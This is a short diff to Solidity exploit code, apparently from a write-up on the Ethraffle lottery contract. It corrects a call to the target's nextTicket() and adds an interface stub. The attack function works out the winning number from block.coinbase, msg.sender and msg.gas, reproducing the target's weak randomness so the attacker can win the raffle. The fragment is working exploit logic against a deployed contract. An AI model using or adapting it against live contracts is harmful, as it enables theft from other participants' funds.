@@ -54,7 +54,7 @@ Exploit
     
         function attack(uint256 _amount) public payable{
         
-            uint current_sold = target.nextTicket;
+            uint current_sold = target.nextTicket();
             if(current_sold + 1 > totalTickets){
                 bytes32 sha = sha3(block.coinbase, msg.sender, msg.gas);
                 uint winningNumber = (uint(sha) % totalTickets) + 1;
@@ -67,4 +67,10 @@ Exploit
             }
             
         }
+    }
+    
+    contract Ethraffle
+    {
+        function buyTickets() payable public;
+        uint public nextTicket;
     }
